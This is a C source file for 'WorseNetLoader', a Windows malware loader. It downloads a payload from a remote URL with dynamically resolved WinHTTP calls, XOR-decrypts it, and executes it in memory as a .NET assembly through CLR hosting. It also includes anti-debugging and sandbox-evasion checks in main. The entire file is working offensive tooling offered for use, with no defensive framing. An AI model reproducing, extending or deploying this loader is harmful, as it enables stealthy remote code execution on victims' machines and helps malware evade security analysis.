
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <winhttp.h>
#include <stdio.h>

#include "WorseNetLoader.h"

 // Maximum size for shellcode (20MB)
#define MAX_SHELLCODE_SIZE (20 * 1024 * 1024)
// Maximum URL length
#define MAX_URL_LENGTH 2048
// Maximum file path length
#define MAX_PATH_LENGTH 256
// Maximum XOR key length
#define MAX_XOR_KEY_LENGTH 256
// Maximum ARGs length
#define MAX_ARG_LENGTH (1024 * 4)

/**
 * Download assembly from a URL using WinHTTP
 *
 * @param k32baseAddr A pointer to kernel32.dll to use for function resolution
 * @param url The URL to download from
 * @param assembly Pointer to buffer where assembly will be stored
 * @param assemblySize Pointer to variable that will store the size of the assembly
 * @return TRUE if download successful, FALSE otherwise
 */
static BOOL DownloadAssembly(HMODULE k32baseAddr, const char* url, PBYTE assembly, DWORD* assemblySize) {
    pLoadLibraryA ptrLoadLibraryA = (pLoadLibraryA)GetProcAddress(k32baseAddr, "LoadLibraryA");
    pFreeLibrary ptrFreeLibrary = (pFreeLibrary)GetProcAddress(k32baseAddr, "FreeLibrary");
    HMODULE hWinHttp = ptrLoadLibraryA("winhttp.dll");
    if (!hWinHttp) {
        printf("[-] Failed to load winhttp.dll: %d\n", GetLastError());
        return FALSE;
    }

    // Dynamically resolve all necessary WinHTTP functions
    printf("[!] Resolving WinHttp functions...\n");
    pWinHttpOpen ptrWinHttpOpen = (pWinHttpOpen)GetProcAddress(hWinHttp, "WinHttpOpen");
    pWinHttpConnect ptrWinHttpConnect = (pWinHttpConnect)GetProcAddress(hWinHttp, "WinHttpConnect");
    pWinHttpOpenRequest ptrWinHttpOpenRequest = (pWinHttpOpenRequest)GetProcAddress(hWinHttp, "WinHttpOpenRequest");
    pWinHttpSendRequest ptrWinHttpSendRequest = (pWinHttpSendRequest)GetProcAddress(hWinHttp, "WinHttpSendRequest");
    pWinHttpReceiveResponse ptrWinHttpReceiveResponse = (pWinHttpReceiveResponse)GetProcAddress(hWinHttp, "WinHttpReceiveResponse");
    pWinHttpReadData ptrWinHttpReadData = (pWinHttpReadData)GetProcAddress(hWinHttp, "WinHttpReadData");
    pWinHttpCloseHandle ptrWinHttpCloseHandle = (pWinHttpCloseHandle)GetProcAddress(hWinHttp, "WinHttpCloseHandle");
    pWinHttpCrackUrl ptrWinHttpCrackUrl = (pWinHttpCrackUrl)GetProcAddress(hWinHttp, "WinHttpCrackUrl");

    if (!ptrWinHttpOpen || !ptrWinHttpConnect || !ptrWinHttpOpenRequest || !ptrWinHttpSendRequest ||
        !ptrWinHttpReceiveResponse || !ptrWinHttpReadData || !ptrWinHttpCloseHandle || !ptrWinHttpCrackUrl) {
        printf("[-] Failed to resolve one or more WinHTTP functions\n");
        ptrFreeLibrary(hWinHttp);
        return FALSE;
    }
    printf("[!] Functions resolved...\n");

    BOOL result = FALSE;
    HINTERNET hSession = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    URL_COMPONENTS urlComp = { 0 };
    WCHAR hostName[256] = { 0 };
    WCHAR urlPath[1024] = { 0 };
    DWORD bytesRead = 0;
    DWORD totalBytesRead = 0;
    LPCWSTR httpVerb = L"GET";
    DWORD flags = WINHTTP_FLAG_REFRESH;

    // Convert ANSI URL to wide string
    int urlLen = (int)strlen(url) + 1;
    WCHAR wUrl[2084] = { 0 };
    if (MultiByteToWideChar(CP_ACP, 0, url, urlLen, wUrl, 2084) == 0) {
        ptrFreeLibrary(hWinHttp);
        return FALSE;
    }

    // Setup URL components
    urlComp.dwStructSize = sizeof(urlComp);
    urlComp.lpszHostName = hostName;
    urlComp.dwHostNameLength = sizeof(hostName) / sizeof(WCHAR);
    urlComp.lpszUrlPath = urlPath;
    urlComp.dwUrlPathLength = sizeof(urlPath) / sizeof(WCHAR);

    // Crack the URL into components
    if (!ptrWinHttpCrackUrl(wUrl, 0, 0, &urlComp)) {
        ptrFreeLibrary(hWinHttp);
        return FALSE;
    }

    // Initialize WinHTTP session
    hSession = ptrWinHttpOpen(L"WorseNetLoader/1.0", WINHTTP_ACCESS_TYPE_NO_PROXY, NULL, NULL, 0);
    if (hSession == NULL) {
        ptrFreeLibrary(hWinHttp);
        return FALSE;
    }

    // Connect to the host
    hConnect = ptrWinHttpConnect(hSession, urlComp.lpszHostName, urlComp.nPort, 0);
    if (hConnect == NULL) {
        goto cleanup;
    }

    // Determine HTTP method and flags
    if (urlComp.nScheme == INTERNET_SCHEME_HTTPS) {
        flags |= WINHTTP_FLAG_SECURE;
    }

    // Open the request
    hRequest = ptrWinHttpOpenRequest(hConnect, httpVerb, urlComp.lpszUrlPath, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (hRequest == NULL) {
        goto cleanup;
    }

    // Send the request
    if (!ptrWinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
        goto cleanup;
    }

    // Receive response
    if (!ptrWinHttpReceiveResponse(hRequest, NULL)) {
        goto cleanup;
    }

    // Read the response body
    while (totalBytesRead < MAX_SHELLCODE_SIZE) {
        if (!ptrWinHttpReadData(hRequest, assembly + totalBytesRead, MAX_SHELLCODE_SIZE - totalBytesRead, &bytesRead)) {
            goto cleanup;
        }

        if (bytesRead == 0) {
            result = TRUE;
            break;
        }

        totalBytesRead += bytesRead;
    }

    if (totalBytesRead >= MAX_SHELLCODE_SIZE) {
        goto cleanup;
    }

    *assemblySize = totalBytesRead;
    printf("[+] Downloaded %d bytes from %s\n", totalBytesRead, url);

cleanup:
    if (hRequest) ptrWinHttpCloseHandle(hRequest);
    if (hConnect) ptrWinHttpCloseHandle(hConnect);
    if (hSession) ptrWinHttpCloseHandle(hSession);
    ptrFreeLibrary(hWinHttp);

    return result;
}

/**
 * XOR decrypt the assembly
 *
 * @param assembly The assembly to decrypt
 * @param assemblySize Size of the assembly
 * @param key The XOR key
 * @return TRUE if decryption successful, FALSE otherwise
 */
static BOOL XorDecryptAssembly(PBYTE assembly, DWORD assemblySize, const char* key) {
    DWORD i = 0;
    size_t keyLength = 0;

    keyLength = strlen(key);
    if (keyLength == 0) {
        printf("[-] Invalid XOR key: empty key\n");
        return FALSE;
    }

    printf("[+] Decrypting assembly with XOR key...\n");

    // XOR each byte with the corresponding byte from the key
    for (i = 0; i < assemblySize; i++) {
        assembly[i] = assembly[i] ^ key[i % keyLength];
    }

    return TRUE;
}

#pragma region Handle Args
/**
 * Determine if the input is a URL
 *
 * @param input The input string to check
 * @return TRUE if the input is a URL, FALSE otherwise
 */
static BOOL IsUrl(const char* input) {
    // Check if the input starts with "http://" or "https://"
    return (strncmp(input, "http://", 7) == 0 || strncmp(input, "https://", 8) == 0);
}

/**
 * Parse the command line arguments
 *
 * @param argc Number of command line arguments
 * @param argv Array of command line arguments
 * @param path Buffer to store the extracted path
 * @param pathSize Size of the path buffer
 * @param xorKey Buffer to store the XOR key
 * @param xorKeySize Size of the XOR key buffer
 * @return TRUE if arguments parsed successfully, FALSE otherwise
 */
static BOOL ParseArguments(int argc, char* argv[], char* path, size_t pathSize,
    char* xorKey, size_t xorKeySize, char* args, size_t argSize) {
    const char* pathPrefix = "/p:";
    const char* xorPrefix = "/x:";
    const char* argsPrefix = "/a:";
    size_t pathPrefixLen = strlen(pathPrefix);
    size_t xorPrefixLen = strlen(xorPrefix);
    size_t argsPrefixLen = strlen(argsPrefix);
    BOOL foundPath = FALSE;

    // Initialize xorKey to empty string
    xorKey[0] = '\0';

    // Process each argument
    for (int i = 1; i < argc; i++) {
        // Check for path argument
        if (strncmp(argv[i], pathPrefix, pathPrefixLen) == 0) {
            errno_t err = strncpy_s(path, pathSize, argv[i] + pathPrefixLen, _TRUNCATE);
            if (err != 0) {
                printf("[-] Error copying path: %d\n", err);
                return FALSE;
            }
            foundPath = TRUE;
        }
        // Check for XOR key argument
        else if (strncmp(argv[i], xorPrefix, xorPrefixLen) == 0) {
            errno_t err = strncpy_s(xorKey, xorKeySize, argv[i] + xorPrefixLen, _TRUNCATE);
            if (err != 0) {
                printf("[-] Error copying XOR key: %d\n", err);
                return FALSE;
            }
        }
        // Check for arguments
        if (strncmp(argv[i], argsPrefix, argsPrefixLen) == 0) {
            errno_t err = strncpy_s(args, argSize, argv[i] + argsPrefixLen, _TRUNCATE);
            if (err != 0) {
                printf("[-] Error copying arguments: %d\n", err);
                return FALSE;
            }
        }
    }

    return 1; // Must have found the path at minimum
}

/**
 * Convert a standard C-style char array to a wide-character LPCWSTR string
 *
 * @param charArray Input null-terminated char array (ANSI)
 * @return Pointer to a newly allocated wide-character string (caller must free)
 */
static wchar_t* convertCharArrayToLPCWSTR(const char* charArray)
{
    wchar_t* wString = new wchar_t[4096];
    MultiByteToWideChar(CP_ACP, 0, charArray, -1, wString, 4096);
    return wString;
}
#pragma endregion

/**
 * Execute a .NET assembly in-memory using CLR hosting APIs
 *
 * @param k32baseAddr Handle to kernel32.dll base for resolving LoadLibraryA and FreeLibrary
 * @param assemblyBytes Pointer to the in-memory .NET assembly byte array
 * @param assemblyByteLen Length of the .NET assembly byte array
 * @param wAssemblyArguments Command-line style string of arguments to pass to the assembly's entry point
 * @return S_OK on success, HRESULT error code on failure
 */
int ExecuteDotNetAssembly(HMODULE k32baseAddr, BYTE* assemblyBytes, DWORD assemblyByteLen, PWSTR wAssemblyArguments) {
    HRESULT hr;
    ICLRMetaHost* pClrMetaHost = NULL;
    ICLRRuntimeInfo* pClrRuntimeInfo = NULL;
    ICorRuntimeHost* pRuntimeHost = NULL;
    IUnknown* pAppDomainThunk = NULL;
    _AppDomain* pAppDomain = NULL;
    _Assembly* pAssembly = NULL;
    _MethodInfo* pMethodInfo = NULL;
    SAFEARRAY* pSafeArray = NULL;

    pLoadLibraryA ptrLoadLibraryA = (pLoadLibraryA)GetProcAddress(k32baseAddr, "LoadLibraryA");
    pFreeLibrary ptrFreeLibrary = (pFreeLibrary)GetProcAddress(k32baseAddr, "FreeLibrary");

    HMODULE ptrMScore = ptrLoadLibraryA("mscoree.dll");
    if (!ptrMScore) {
        printf("[-] Failed to load mscoree.dll: %d\n", GetLastError());
        return FALSE;
    }
    pCLRCreateInstance ptrCLRCreateInstance = (pCLRCreateInstance)GetProcAddress(ptrMScore, "CLRCreateInstance");

    // 1. Start the CLR
    hr = ptrCLRCreateInstance(gCLSID_CLRMetaHost, gIID_ICLRMetaHost, (LPVOID*)&pClrMetaHost);
    if (FAILED(hr)) return hr;

    hr = pClrMetaHost->lpVtbl->GetRuntime(pClrMetaHost, L"v4.0.30319", gIID_ICLRRuntimeInfo, (LPVOID*)&pClrRuntimeInfo);
    if (FAILED(hr)) return hr;

    BOOL fLoadable;
    hr = pClrRuntimeInfo->lpVtbl->IsLoadable(pClrRuntimeInfo, &fLoadable);
    if (FAILED(hr) || !fLoadable) return E_FAIL;

    hr = pClrRuntimeInfo->lpVtbl->GetInterface(pClrRuntimeInfo, gCLSID_CorRuntimeHost, gIID_ICorRuntimeHost, (LPVOID*)&pRuntimeHost);
    if (FAILED(hr)) return hr;

    hr = pRuntimeHost->lpVtbl->Start(pRuntimeHost);
    if (FAILED(hr)) return hr;

    // 2. Create the AppDomain
    hr = pRuntimeHost->lpVtbl->CreateDomain(pRuntimeHost, L"AppDomain", NULL, &pAppDomainThunk);
    if (FAILED(hr)) return hr;

    hr = pAppDomainThunk->QueryInterface(gIID_AppDomain, (void**)&pAppDomain);
    if (FAILED(hr)) return hr;

    // 3. Load the assembly from memory
    SAFEARRAYBOUND bounds = { assemblyByteLen, 0 };
    pSafeArray = SafeArrayCreate(VT_UI1, 1, &bounds);

    void* pData = NULL;
    SafeArrayAccessData(pSafeArray, &pData);
    memcpy(pData, assemblyBytes, assemblyByteLen);
    SafeArrayUnaccessData(pSafeArray);

    hr = pAppDomain->lpVtbl->Load_3(pAppDomain, pSafeArray, &pAssembly);
    if (FAILED(hr)) return hr;

    // 4. Get the entry point
    hr = pAssembly->lpVtbl->EntryPoint(pAssembly, &pMethodInfo);
    if (FAILED(hr)) return hr;

    // 5. Prepare arguments for Main(string[] args)
    int argCount;
    LPWSTR* argArray = CommandLineToArgvW(wAssemblyArguments, &argCount);
    SAFEARRAY* psaParams = SafeArrayCreateVector(VT_VARIANT, 0, 1);
    VARIANT vtArgs;
    vtArgs.vt = (VT_ARRAY | VT_BSTR);
    vtArgs.parray = SafeArrayCreateVector(VT_BSTR, 0, argCount);
    printf("[!] Passing Arguments: %ls\n", wAssemblyArguments);
    for (LONG i = 0; i < argCount; i++) {
        BSTR bstrArg = SysAllocString(argArray[i]);
        hr = SafeArrayPutElement(vtArgs.parray, &i, bstrArg);
        if (FAILED(hr)) {
            printf("[-] Issue putting bstrArg to array!\n");
        }
    }

    LONG index = 0;
    hr = SafeArrayPutElement(psaParams, &index, &vtArgs);
    if (FAILED(hr)) {
        printf("[-] Issue putting vtArgs to array!\n");
    }

    // 6. Invoke entry point
    VARIANT result;
    VariantInit(&result);
    VARIANT emptyObj;
    VariantInit(&emptyObj);
    emptyObj.vt = VT_NULL;

    hr = pMethodInfo->lpVtbl->Invoke_3(pMethodInfo, emptyObj, psaParams, &result);
    if (FAILED(hr)) return hr;

    // Cleanup
    VariantClear(&vtArgs);
    SafeArrayDestroy(psaParams);
    SafeArrayDestroy(vtArgs.parray);
    SafeArrayDestroy(pSafeArray);
    VariantClear(&result);

    pMethodInfo->lpVtbl->Release(pMethodInfo);
    pAssembly->lpVtbl->Release(pAssembly);
    pAppDomain->lpVtbl->Release(pAppDomain);
    pAppDomainThunk->Release();
    pRuntimeHost->lpVtbl->Release(pRuntimeHost);
    pClrRuntimeInfo->lpVtbl->Release(pClrRuntimeInfo);
    pClrMetaHost->lpVtbl->Release(pClrMetaHost);

    ptrFreeLibrary(ptrMScore);

    return S_OK;
}

/**
 * Main function
 *
 * @param argc Number of command line arguments
 * @param argv Array of command line arguments
 * @return 0 if successful, non-zero otherwise
 */
int main(int argc, char* argv[]) {
    BYTE* assembly = NULL;
    DWORD assemblySize = 0;
    char path[MAX_URL_LENGTH] = { 0 };
    char args[MAX_ARG_LENGTH] = { 0 };
    char xorKey[MAX_XOR_KEY_LENGTH] = { 0 };
    BOOL result = FALSE;

    // Don't run if debugger attached
    if (IsDebuggerPresent()) {
        printf("[-] Cheating Tool Detected!\n");
        return 1;
    }

    // Simple sandbox evasion
    DWORD64 start = GetTickCount64();
    Sleep(5000);
    DWORD64 end = GetTickCount64();
    if ((end - start) < 4500) {
        printf("[-] Cheating Tool Detected!\n");
        return 1;
    }

    HMODULE k32baseAddr = NULL;
    HMODULE ntbaseAddr = NULL;

    // Find K32 to use as the base address
    k32baseAddr = GetModuleHandle(L"kernel32.dll");
    ntbaseAddr = GetModuleHandle(L"ntdll.dll");


    // Allocate assembly buffer on heap instead of stack to prevent stack overflow
    assembly = (BYTE*)malloc(MAX_SHELLCODE_SIZE);
    if (assembly == NULL) {
        printf("[-] Failed to allocate memory for assembly\n");
        return 1;
    }

    // Zero the memory
    memset(assembly, 0, MAX_SHELLCODE_SIZE);

    // Parse the command line arguments
    if (!ParseArguments(argc, argv, path, sizeof(path), xorKey, sizeof(xorKey), args, sizeof(args))) {
        printf("[-] Invalid arguments\n");
        printf("Usage:\n");
        printf("  %s /p:http://example.com/FILETOLOAD [/x:XOR_KEY] [/a:ARGUMENTS]\n", argv[0]);
        free(assembly);
        return 1;
    }

    // Load the assembly
    printf("Preparing to begin download...\n");
    if (IsUrl(path)) {
        result = DownloadAssembly(k32baseAddr, path, assembly, &assemblySize);
    }
    else {
        printf("[-] Wrong Path\n");
        return 1;
    }

    if (!result || assemblySize == 0) {
        printf("[-] Failed to load assembly\n");
        free(assembly);
        return 1;
    }

    // Decrypt the assembly if XOR key is provided
    if (xorKey[0] != '\0') {
        if (!XorDecryptAssembly(assembly, assemblySize, xorKey)) {
            printf("[-] Failed to decrypt assembly\n");
            free(assembly);
            return 1;
        }
    }

    // Execute the assembly
    ExecuteDotNetAssembly(k32baseAddr, assembly, assemblySize, convertCharArrayToLPCWSTR(args));
    // Note: We intentionally don't free assembly here since ExecuteDotNetAssembly might still be using it.
    return 0;
}
